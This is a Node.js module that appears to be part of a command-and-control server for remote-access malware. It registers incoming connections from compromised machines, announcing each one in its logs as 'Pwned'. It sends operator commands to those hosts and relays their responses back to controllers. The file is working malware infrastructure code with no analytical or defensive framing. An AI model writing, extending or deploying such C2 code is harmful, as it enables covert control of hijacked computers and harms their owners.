const { Socket } = require('net');
const { PacketConnection } = require('../protocol/connection');
const { packet_types } = require('../protocol/protocol');
const { createPacket } = require('../protocol/packet');
const { parsePacket, serializePacket } = require('../protocol/packet');
const { controllers } = require('./control');

const hosts = [];

class Host {
    /**
     * @param {Socket} socket
     */
    constructor(socket) {
        this.connection = new PacketConnection(socket);
        this.connection.on('packet', (data) => {
            let packet = parsePacket('host', 'response', data);
            this.handleResponse(packet);
        });
    }

    /**
     * Handle response from this host
     * ! Not meant to be called outside of this class !
     * @param {*} packet 
     */
    handleResponse(packet) {
        let wrappedPkt = {
            _ptype: packet_types.control.response.get('hostresponse'),
            data: packet,
        };
        //TODO: broadcast to any clients
        try {
            controllers[0].send(wrappedPkt);
        } catch (err) {
            //TODO
            console.error(err);
        }
    }

    /**
     * Send packet to this host
     * @param {*} packet 
     */
    sendCommand(packet) {
        this.connection.write(serializePacket(packet));
    }
}

/**
 * @param {Socket} socket
 */
function handleIncomingHost(socket) {
    let host = new Host(socket);
    hosts.push(host);
    console.log(`[+] Pwned ${socket.remoteAddress} ;)`);
    socket.on('close', () => {
        console.log(`[-] Host ${socket.remoteAddress} disconnected`);
        hosts.splice(hosts.findIndex(i => i == host), 1);
    });
    socket.on('error', () => {
        console.log(`[!] Host ${socket.remoteAddress} forcibly exited`);
        hosts.splice(hosts.findIndex(i => i == host), 1);
    });
    let packet = createPacket('control', 'response', 'newpwn');
    packet.ip = socket.remoteAddress;
    for (let c of controllers) {
        c.sendResponse(packet);
    }
}

exports.hosts = hosts;
exports.handleIncomingHost = handleIncomingHost;
